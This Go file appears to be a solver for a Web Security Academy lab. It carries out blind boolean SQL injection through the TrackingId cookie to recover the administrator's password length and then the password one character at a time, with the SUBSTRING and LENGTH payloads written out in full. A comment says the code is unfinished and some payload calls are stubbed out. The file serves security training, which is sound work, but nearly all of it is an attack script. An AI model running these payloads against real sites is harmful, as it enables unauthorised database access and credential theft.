package main

// Note: this code is not working, need to work on it.
import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

var (
	host       = "https://ac1e1f031e804efec035068b008800b7.web-security-academy.net/"
	filter     = "filter?category=Pets"
	session    = "a6LG2V4Frp3apDInyFBYOfrpaBYn0rqq"
	trackingId = "2G9CdMMsmQFCMngq"
)

func MakePost(trackingId string) string {
	req, err := http.NewRequest(
		"GET",
		host+filter,
		nil)
	if err != nil {
		panic(err)
	}
	fmt.Println(trackingId)
	req.Header.Add("Host", host)
	req.AddCookie(&http.Cookie{
		Name:  "session",
		Value: session,
	})
	req.AddCookie(&http.Cookie{
		Name:  "TrackingId",
		Value: trackingId,
	})
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Err in client.Do %v\n", err)
	}
	defer resp.Body.Close()
	bd, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Err reading response body %v", err)
	}
	return string(bd)

}
func GuessPassLength() int {
	fmt.Println("Getting password length")
	//lenq := "%s'+AND+(+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(+password+)>%d)='a"
	//lenq := "%s' AND ( SELECT 'a' FROM users WHERE username='administrator' AND LENGTH( password )>%d )='a"
	start := 1
	for {
		d := MakePost("2G9CdMMsmQFCMngq")
		//d := MakePost(fmt.Sprintf(lenq, trackingId, start))
		fmt.Println(d)
		if strings.Contains(d, "Welcome back") {
			fmt.Printf("password length is greater than %d\n", start)
		} else {
			fmt.Printf("Password is of length %d\n", start)
			break
		}
		start++
		// do not want to overwhelm
		if start > 100 {
			break
		}
	}
	return start
}
func GuessAdminPass(passl int) {
	// We assume that table name is users, fields are username, password
	// ,there is a user administrator and password is alphanumeric with only lowercase
	chars := "0123456789abcdefghijklmnopqrstuvwxyz"
	chq := "%s'+AND+SUBSTRING+(+(+SELECT+Password+FROM+Users+WHERE+Username='administrator'+),%d,1)='%s"
	k := 1
	pass := ""
	for {
		for _, v := range chars {
			d := MakePost(fmt.Sprintf(chq, trackingId, k, string(v)))
			fmt.Println(d)
			if strings.Contains(d, "Welcome back") {
				pass = pass + string(v)
			}
		}
		fmt.Printf("Pass so far %s\n", pass)
		k++
		if k > passl {
			break
		}
	}

}
func main() {
	passl := GuessPassLength()
	fmt.Println(passl)
	//GuessAdminPass(20)
}
